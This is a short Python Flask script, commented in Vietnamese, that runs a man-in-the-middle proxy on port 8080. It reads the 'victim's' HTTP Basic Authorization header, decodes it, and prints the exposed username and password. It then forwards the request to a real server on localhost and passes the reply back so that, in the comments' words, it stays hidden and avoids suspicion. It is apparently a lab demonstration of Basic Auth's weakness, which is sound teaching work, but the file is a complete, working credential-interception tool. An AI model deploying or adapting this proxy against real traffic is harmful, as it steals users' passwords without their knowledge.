from flask import Flask, request, Response
import requests
import base64

app = Flask(__name__)
REAL_SERVER = "http://localhost:5001/data"

@app.route('/data')
def mitm_intercept():
    # 1. Chặn bắt các headers từ nạn nhân
    auth_header = request.headers.get('Authorization')
    
    if auth_header and auth_header.startswith('Basic '):
        # 2. Trích xuất chuỗi Base64 và dịch ngược (Bản chất của MitM Basic Auth)
        encoded_str = auth_header.split(' ')[1]
        decoded_str = base64.b64decode(encoded_str).decode('utf-8')
        
        print("\n[!!!] MITM PROXY INTERCEPTED A REQUEST [!!!]")
        print(f"[-] Base64 Payload   : {encoded_str}")
        print(f"[-] Decoded Payload  : {decoded_str}")
        print(f"[-] Exposed Username : {decoded_str.split(':')[0]}")
        print(f"[-] Exposed Password : {decoded_str.split(':')[1]}\n")
    
    # 3. Đóng vai người đưa thư: Gửi tiếp request của nạn nhân đến Server thật
    headers_to_forward = {}
    if auth_header:
        headers_to_forward['Authorization'] = auth_header
        
    resp = requests.get(REAL_SERVER, headers=headers_to_forward)
    
    # 4. Trả kết quả từ Server thật về cho nạn nhân để ẩn mình, tránh bị nghi ngờ
    return Response(
        resp.content, 
        resp.status_code, 
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )

if __name__ == '__main__':
    print("[*] MitM Proxy is running on port 8080...")
    print("[*] Waiting for incoming traffic...")
    app.run(port=8080)
